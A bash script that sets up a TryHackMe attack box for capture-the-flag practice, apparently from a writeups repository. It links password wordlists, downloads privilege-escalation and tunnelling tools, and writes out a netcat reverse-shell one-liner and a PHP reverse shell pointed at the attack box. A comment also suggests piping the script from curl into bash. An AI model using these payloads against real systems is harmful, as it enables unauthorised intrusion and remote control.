#! /bin/bash

echo "-- THM attack box setup --" 
# intended to be copy pasted into the shell, or run in one command via:
#   curl -s https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/thm-setup.sh | bash

echo "linking wordlists locally"
ln -s /usr/share/wordlists/rockyou.txt rockyou.txt
(echo ".git"; grep -v "#" /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt) > dirwordlist.txt

echo "linpeas & les local copies"
wget -q https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh
wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

echo "quick commands"
echo "docker run -it --rm --name rustscan rustscan/rustscan:latest -a \$1 -- -sV" > rustscan.sh
chmod +x rustscan.sh

echo "tool download scripts"
echo "wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz && gunzip chisel_1.7.6_linux_amd64.gz && mv chisel_1.7.6_linux_amd64 chisel && chmod +x chisel" > get-chisel-linux.sh
chmod +x get-chisel-linux.sh
echo "wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz && gunzip chisel_1.7.6_windows_amd64.gz && mv chisel_1.7.6_windows_amd64 chisel.exe" > get-chisel-windows.sh
chmod +x get-chisel-windows.sh

echo "static binary download scripts"
echo "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" > get-static-binaries.sh
chmod +x get-static-binaries.sh

echo "useful payloads"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(hostname -i) 4444 >/tmp/f" > nc-rev.txt
cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php && sed -i "s/PUT_THM_ATTACKBOX_IP_HERE/$(hostname -i)/g" reverse.php && sed -i "s/1234/4444/g" reverse.php

echo "chattr alternative for koth (as mf.c, uncompiled)"
wget -q https://gist.githubusercontent.com/ChrisPritchard/05d98e1d195bc255b30674c8ce0fec50/raw/44b4079a5317820db6789b90a0c6d0dfb2330609/mf.c -O mf.c

echo "ready!"
